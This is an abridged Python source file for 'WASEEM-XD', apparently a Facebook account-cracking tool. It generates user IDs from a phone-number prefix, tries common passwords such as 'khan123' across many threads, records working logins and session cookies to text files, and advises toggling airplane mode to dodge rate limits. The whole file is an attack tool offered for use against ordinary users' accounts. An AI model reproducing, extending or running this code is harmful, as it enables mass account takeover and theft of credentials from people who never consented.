...
\033[1;34m╚███╔███╔╝██║  ██║███████║███████╗███████╗██║ ╚═╝ ██║    
 \033[1;35m╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝\SHANO   
--------------------------------------------------
[•] AUTHOR     : \033[1;32mPOMI SHEHZAD \033[1;37m
[•] GITHUB     : \033[1;32mNOT FOUND\033[1;37m
[•] TOOL NAME  : \033[1;32mWASEEM-XD\033[1;37m
...
try:
    ...
    os.system("xdg-open https://www.facebook.com/profile.php?id=100077266963985")
...
def WASEEM():
	...
	if gh =='1':
		...
		os.system("xdg-open https://facebook.com/groups/107930916067208/")
		bd()
	elif gh =='3':
		chos()
	elif gh =='4':
...
def ali_khan():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,kode+guru,'khan khan','khankhan','khan1122','khan12','khan123','khan786']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
...
def bd():
	...
	os.system('clear')
	print(logo)
	print('[•] EXAMPLE : 88017,88018,88019,88****,.ETC')
	lines()
	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
...
def chos():
    ...
    with ThreadPool(max_workers=70) as manshera:
        ...
        print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mCHOOSE PASS')
        print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
        lines()
        for love in user:
            pwx = [love[1:]]
...
def gmail():
    ...
    os.system('clear')
    print(logo)
    print("[•] FIRST NAME EXAMPLE : sial,khan...etc \n[•] LAST NAME EXAMPLE : WASEEM,ayesh...etc");lines()
...
def fcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=InaOZRCGjfSmsxfmNwa5f07B; sb=InaOZXVwTfspHr4dWaFvPLBL; m_pixel_ratio=2; wd=360x698; fr=0qZtOBGJyrjdPCWsG..BljnYi.Ds.AAA.0.0.BljnY1.AWWovYRAJXA',
    'dpr': '2',
   ...
   #         print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[WASEEM-XD-OK] '+cid+' | '+ps+'\x1b[1;97m')
                lines()
                print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
                lines()
                open('/sdcard/WASEEM-XD-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
          #      print('\033[1;33m[WASEEM-XD-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('WASEEM-XD-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97m WASEEM \033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
